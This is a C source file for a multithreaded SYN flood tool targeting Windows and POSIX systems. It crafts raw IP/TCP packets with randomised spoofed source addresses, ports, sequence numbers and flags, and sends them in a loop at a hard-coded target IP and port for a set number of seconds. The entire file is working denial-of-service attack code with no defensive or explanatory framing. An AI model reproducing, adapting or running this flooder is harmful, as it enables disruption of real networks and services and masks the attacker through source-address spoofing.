#ifdef _WIN32
    #include <Windows.h>
    #include <WinSock2.h>
    #include <WS2tcpip.h> 
#else
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <unistd.h>
    #include <pthread.h>
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "headers.h"
#include "randcmwc.h"

#define IPADDRESS "192.168.1.100"
#define PORT 80
#define NUM_OF_THREADS 3
#define RUN_SECONDS 5
#define USE_RANDOM_FLAGS 1
#define MAX_PACKET_LENGTH 4096

// 1 byte for true or false in main while loop
uint8_t FLOODING = 1;

// different threads need different function types
#ifdef _WIN32
    DWORD WINAPI syn_flood(LPVOID args)
#else
    unsigned int thread_count;
    void *syn_flood()
#endif
{
    char datagram[MAX_PACKET_LENGTH];
    struct iphdr *iph = (struct iphdr *)datagram; 
    struct tcphdr *tcph = (void*)iph + sizeof(struct iphdr); //! (void*)

    // info on target
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_port = htons(PORT);
    dst.sin_addr.s_addr = inet_addr(IPADDRESS);

    // if compiled on windows then start WSA
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0 ) {
            perror("WSAStartup failed: \n");
        }
    #endif

    // creating raw socket // btw uint64_t is unsigned long long which is SOCKET type
    uint64_t s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
            perror("Could not create raw socket, are you running in root? Error: \n");
            exit(-1); // close program
    }
    memset(datagram, 0, MAX_PACKET_LENGTH); // wipe datagram
    header_setup(iph, tcph); // fill out ip and tcp header fields

    // add the destination fields
    // Target IP and PORT can be changed at the top of file
    tcph->dest = htons(PORT); // set port
    iph->ip_dst = dst.sin_addr.s_addr; // set IP
    iph->check = checksum ((uint16_t *)datagram, iph->tot_len);
    
    // set socket option to use the headers that were just set up
    int error_code = 1;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&error_code, sizeof(error_code)) < 0) {
            perror("IP_HDRINCL cannot be set: \n");
            exit(-1);
    }

    // vars to change the same tcp header flags
    register int i = 0;
    //if (USE_RANDOM_FLAGS) { commented this out just for now
    uint16_t psh = 0;
    uint16_t res1 = 0;
    uint16_t res2 = 0;
    //}
    uint32_t rand_num;
    
    // after RUN_SECONDS is done FLOODING is set to 0 in the main thread ending the loop
    while(FLOODING)
    {
        // send raw packet
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &dst, sizeof(dst));

        // rerandomize
        rand_num = rand_cmwc();
        iph->ip_src = (rand_num >> 24 & 0xFF) << 24 |
                      (rand_num >> 16 & 0xFF) << 16 |
                      (rand_num >> 8 & 0xFF) << 8 |
                      (rand_num & 0xFF);

        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = checksum ((uint16_t*) datagram, iph->tot_len);

        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);

        if (USE_RANDOM_FLAGS) {
            // random flags
            if(psh > 1)  { psh = 1;  } 
            if(res1 > 4) { res1 = 0; }
            if(res2 > 3) { res2 = 0; }
            tcph->psh = psh;
            tcph->res1 = res1;
            tcph->res2 = res2;
            psh++; res1++; res2++; 
        }
        i++;
        tcph->check = tcp_checksum(iph, tcph);
    }
    printf("Done! sent %d packets\n", i);
    #ifndef _WIN32
        __sync_fetch_and_sub(&thread_count,1); // this is kinda nice
    #endif
}

int main()
{
    init_rand(time(NULL)); // initialize fast num gen
    srand(time(NULL)); // set seed
    
    #ifdef _WIN32
        int i;
        HANDLE array_of_threads[NUM_OF_THREADS];

        //start threads
        for (i = 0; i < NUM_OF_THREADS; i++)
        {
            array_of_threads[i] = CreateThread(NULL, 0, &syn_flood, NULL, 0, NULL);
        }

        printf("flooding %s...\n", IPADDRESS);
        Sleep(RUN_SECONDS * 1000); // wait milliseconds
        FLOODING = 0; // then stop threads
        
        // wait for threads to end then end
        WaitForMultipleObjects(NUM_OF_THREADS, array_of_threads, TRUE, INFINITE);
        
        for (i = 0; i < NUM_OF_THREADS; i++) {
            CloseHandle(array_of_threads[i]);
        }

    #else
        pthread_t thread[NUM_OF_THREADS];
        thread_count = NUM_OF_THREADS;

        for(int i = 0; i < NUM_OF_THREADS; i++) {
                pthread_create(&thread[i], NULL, &syn_flood, NULL);
        }
        printf("flooding %s...\n", IPADDRESS);
        sleep(RUN_SECONDS);
        FLOODING = 0;
        do {
            __sync_synchronize();
        } while (thread_count);
        return 0;
    #endif

    printf("return 0\n");
    return 0;
}
